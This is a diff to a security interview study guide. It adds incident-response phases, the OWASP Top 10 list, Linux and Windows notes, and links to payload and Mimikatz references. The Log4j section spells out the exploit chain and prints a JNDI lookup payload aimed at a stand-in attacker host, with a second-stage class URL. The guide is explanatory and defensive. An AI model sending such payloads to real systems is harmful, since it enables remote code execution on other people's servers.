@@ -14,6 +14,23 @@ description: A quick reference of relevant security topics for technical intervi
 
 <figure><img src="https://www.cynet.com/wp-content/uploads/2019/08/nist-incident-response-process-1.png" alt=""><figcaption><p>SANS</p></figcaption></figure>
 
+* **Preparation**: Refers to the organizational preparation that is needed to be able to respond, including tools, processes, competencies, and readiness.
+* **Detection & analysis**: Refers to the activity to detect a security incident in a production environment and to analyze all events to confirm the authenticity of the security incident.
+* **Containment, eradication, recovery**: Refers to the required and appropriate actions taken to contain the security incident based on the analysis done in the previous phase. More analysis may also be necessary in this phase to fully recovery from the security incident.
+* **Post-incident activity**: Refers to the post-mortem analysis performed after the recovery of a security incident. The operational actions performed during the process are reviewed to determine if any changes need to be made in the preparation or detection and analysis phases.
+
+### Major Incidents
+
+* Log4j
+  * Exploit steps:
+    1. Data from the User gets sent to the server (via any protocol).
+    2. logs the data containing the malicious payload from the request `${jndi:ldap://some-attacker.com/a}`, where `some-attacker.com` is an attacker controlled server.
+    3. The log4j vulnerability is triggered by this payload and the server makes a request to `some-attacker.com` via "[Java Naming and Directory Interface](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)" (JNDI).
+    4. This response contains a path to a remote Java class file (ex. `http://second-stage.some-attacker.com/Exploit.class`), which is injected into the server process.
+    5. This injected payload triggers a second stage, and allows an attacker to execute arbitrary code.
+  * Detection:
+    * Web server logs - [link](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml)
+
 ## Logs
 
 ### Log sources
@@ -172,54 +189,18 @@ description: A quick reference of relevant security topics for technical intervi
 
 ## Web Application
 
-* Same origin policy
-  * Only accept requests from the same origin domain.
-* CORS
-  * Cross-Origin Resource Sharing. Can specify allowed origins in HTTP headers. Sends a preflight request with options set asking if the server approves, and if the server approves, then the actual request is sent (eg. should client send auth cookies).
-* HSTS
-  * Policies, eg what websites use HTTPS.
-* Cert transparency
-  * Can verify certificates against public logs
-* HTTP Public Key Pinning
-  * (HPKP)
-  * Deprecated by Google Chrome
-* Cookies
-  * httponly - cannot be accessed by javascript.
-* CSRF
-  * Cross-Site Request Forgery.
-  * Cookies.
-* XSS
-  * Reflected XSS.
-  * Persistent XSS.
-  * DOM based /client-side XSS.
-  * `<img scr=””>` will often load content from other websites, making a cross-origin HTTP request.
-* SQLi
-  * Person-in-the-browser (flash / java applets) (malware).
-  * Validation / sanitisation of webforms.
-* POST
-  * Form data.
-* GET
-  * Queries.
-  * Visible from URL.
-* Directory traversal
-  * Find directories on the server you’re not meant to be able to see.
-  * There are tools that do this.
-* APIs
-  * Think about what information they return.
-  * And what can be sent.
-* Beefhook
-  * Get info about Chrome extensions.
-* User agents
-  * Is this a legitimate browser? Or a botnet?
-* Browser extension take-overs
-  * Miners, cred stealers, adware.
-* Local file inclusion
-* Remote file inclusion (not as common these days)
-* SSRF
-  * Server Side Request Forgery.
-* Web vuln scanners.
-* SQLmap.
-* Malicious redirects.
+#### OWASP Top 10
+
+1. [**A01:2021-Broken Access Control**](https://owasp.org/Top10/A01\_2021-Broken\_Access\_Control/) moves up from the fifth position; 94% of applications were tested for some form of broken access control. The 34 Common Weakness Enumerations (CWEs) mapped to Broken Access Control had more occurrences in applications than any other category.
+2. [**A02:2021-Cryptographic Failures**](https://owasp.org/Top10/A02\_2021-Cryptographic\_Failures/) shifts up one position to #2, previously known as Sensitive Data Exposure, which was broad symptom rather than a root cause. The renewed focus here is on failures related to cryptography which often leads to sensitive data exposure or system compromise.
+3. [**A03:2021-Injection**](https://owasp.org/Top10/A03\_2021-Injection/) slides down to the third position. 94% of the applications were tested for some form of injection, and the 33 CWEs mapped into this category have the second most occurrences in applications. Cross-site Scripting is now part of this category in this edition.
+4. [**A04:2021-Insecure Design**](https://owasp.org/Top10/A04\_2021-Insecure\_Design/) is a new category for 2021, with a focus on risks related to design flaws. If we genuinely want to “move left” as an industry, it calls for more use of threat modeling, secure design patterns and principles, and reference architectures.
+5. [**A05:2021-Security Misconfiguration**](https://owasp.org/Top10/A05\_2021-Security\_Misconfiguration/) moves up from #6 in the previous edition; 90% of applications were tested for some form of misconfiguration. With more shifts into highly configurable software, it’s not surprising to see this category move up. The former category for XML External Entities (XXE) is now part of this category.
+6. [**A06:2021-Vulnerable and Outdated Components**](https://owasp.org/Top10/A06\_2021-Vulnerable\_and\_Outdated\_Components/) was previously titled Using Components with Known Vulnerabilities and is #2 in the Top 10 community survey, but also had enough data to make the Top 10 via data analysis. This category moves up from #9 in 2017 and is a known issue that we struggle to test and assess risk. It is the only category not to have any Common Vulnerability and Exposures (CVEs) mapped to the included CWEs, so a default exploit and impact weights of 5.0 are factored into their scores.
+7. [**A07:2021-Identification and Authentication Failures**](https://owasp.org/Top10/A07\_2021-Identification\_and\_Authentication\_Failures/) was previously Broken Authentication and is sliding down from the second position, and now includes CWEs that are more related to identification failures. This category is still an integral part of the Top 10, but the increased availability of standardized frameworks seems to be helping.
+8. [**A08:2021-Software and Data Integrity Failures**](https://owasp.org/Top10/A08\_2021-Software\_and\_Data\_Integrity\_Failures/) is a new category for 2021, focusing on making assumptions related to software updates, critical data, and CI/CD pipelines without verifying integrity. One of the highest weighted impacts from Common Vulnerability and Exposures/Common Vulnerability Scoring System (CVE/CVSS) data mapped to the 10 CWEs in this category. Insecure Deserialization from 2017 is now a part of this larger category.
+9. [**A09:2021-Security Logging and Monitoring Failures**](https://owasp.org/Top10/A09\_2021-Security\_Logging\_and\_Monitoring\_Failures/) was previously Insufficient Logging & Monitoring and is added from the industry survey (#3), moving up from #10 previously. This category is expanded to include more types of failures, is challenging to test for, and isn’t well represented in the CVE/CVSS data. However, failures in this category can directly impact visibility, incident alerting, and forensics.
+10. [**A10:2021-Server-Side Request Forgery**](https://owasp.org/Top10/A10\_2021-Server-Side\_Request\_Forgery\_\(SSRF\)/) is added from the Top 10 community survey (#1). The data shows a relatively low incidence rate with above average testing coverage, along with above-average ratings for Exploit and Impact potential. This category represents the scenario where the security community members are telling us this is important, even though it’s not illustrated in the data at this time.
 
 ## Infrastructure (Prod / Cloud) Virtualisation
 
@@ -242,36 +223,33 @@ description: A quick reference of relevant security topics for technical intervi
 
 ### Linux
 
+#### File Structure
+
 <figure><img src="http://www.blackmoreops.com/wp-content/uploads/2015/02/Linux-file-system-hierarchy-Linux-file-structure-optimized.jpg" alt=""><figcaption></figcaption></figure>
 
-* Privilege escalation techniques, and prevention.
-* Buffer Overflows.
-* Directory traversal (prevention).
-* Remote Code Execution / getting shells.
-* Local databases
-  * Some messaging apps use sqlite for storing messages.
-  * Useful for digital forensics, especially on phones.
-* Windows
-  * Windows registry and group policy.
-  * Active Directory (AD).
-    * Bloodhound tool.
-    * Kerberos authentication with AD.
-  * Windows SMB.
-  * Samba (with SMB).
-  * Buffer Overflows.
-  * ROP.
-* \*nix
-  * SELinux.
-  * Kernel, userspace, permissions.
-  * MAC vs DAC.
-  * /proc
-  * /tmp - code can be saved here and executed.
-  * /shadow
-  * LDAP - Lightweight Directory Browsing Protocol. Lets users have one password for many services. This is similar to Active Directory in windows.
-* MacOS
-  * Gotofail error (SSL).
-  * MacSweeper.
-  * Research Mac vulnerabilities.
+#### Shell Cheatsheet
+
+<figure><img src=".gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>
+
+#### Key points
+
+* Linux persistence mechanism - [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Persistence.md)
+*
+
+### Windows
+
+#### Shell Cheatsheet
+
+<figure><img src=".gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>
+
+<figure><img src=".gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>
+
+Key Points
+
+* Logging cheatsheet - [link](https://static1.squarespace.com/static/552092d5e4b0661088167e5c/t/5c586681f4e1fced3ce1308b/1549297281905/Windows+Logging+Cheat+Sheet\_ver\_Feb\_2019.pdf)
+* Mimikatz - [link](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Mimikatz.md)
 
 ## Mitigations
 
@@ -394,6 +372,7 @@ description: A quick reference of relevant security topics for technical intervi
 
 ## Exploits
 
+* Payload examples - [link](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Methodology%20and%20Resources)
 * Three ways to attack - Social, Physical, Network
   * **Social**
     * Ask the person for access, phishing.
@@ -438,7 +417,7 @@ description: A quick reference of relevant security topics for technical intervi
 
 ## Attack Structure
 
-Practice describing security concepts in the context of an attack. These categories are a rough guide on attack structure for a targeted attack. Non-targeted attacks tend to be a bit more "all-in-one".
+<figure><img src=".gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>
 
 * Reconnaissance
   * OSINT, Google dorking, Shodan.
